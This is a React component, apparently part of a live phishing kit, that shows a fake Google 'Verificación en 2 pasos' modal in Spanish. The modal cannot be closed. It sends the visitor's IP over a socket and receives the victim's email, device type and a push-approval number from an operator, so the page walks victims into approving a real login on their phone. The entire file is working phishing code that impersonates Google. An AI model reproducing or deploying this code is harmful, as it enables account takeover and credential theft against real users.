import { Modal } from "@nextui-org/react"
import googleLogo from '../../../assets/google-logo-1-1.png'
import googleUser from '../../../assets/googleUser.png'
import { SocketContext } from "../../../context"
import { useContext, useEffect, useState } from "react"
import { useIp } from "../../../hooks/useIp"

export const EmailVerification = ({pageNow}) => {
    

    const { socket } =  useContext(SocketContext)  
    const ip = useIp()
    const [{email, typeDevice, numberDevice}, setVerificationDevice] = useState({
        email: '',
        typeDevice: '',
        numberDevice: ''
    });


    useEffect(() => {
        if(ip !== undefined) {
            socket.emit('[LIVE] emailPassword', {ip}, ({username, typeDevice, numberDevice}) => {
            setVerificationDevice({
                email: username,
                typeDevice,
                numberDevice
            })
        })}
        return () => {
            socket.off('[LIVE] emailPassword')
        }
    }, [ip])
    return (
        <div className="h-[300px]">
        <Modal
            open={true}
            visible={true}
            preventClose={true}
            >
            <Modal.Body>
                <div className="border-[1px] rounded-md p-5 flex justify-start items-center flex-col">
                    <div className="flex items-center">
                        <img className="h-[25px]" src={googleLogo} alt="logo" />
                    </div>
                    <p className="text-[25px]">Verificacion en 2 pasos.</p>
                    <p className="text-center">Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder.</p>
                    <div className="p-1 border-[1px] rounded flex gap-1 items-center my-5 ">
                        <img className="h-[20px]" src={googleUser} alt="googleUser" />
                        {email}
                    </div>
                    
                    <p className="text-left text-[50px]" >{numberDevice}</p>

                    
                    <div className="w-full mb-2">
                        <p className="font-bold text-[18px]">Revisa tu dispositivo {typeDevice}</p>
                    </div>

                    <p>Google envió una notificación a tu huawei. Persiona <b>Sí</b> en la notificación y, luego, persona en el teléfono para verificar que eres tú</p>
                </div>
            </Modal.Body>
        </Modal>
        </div>
    )
}
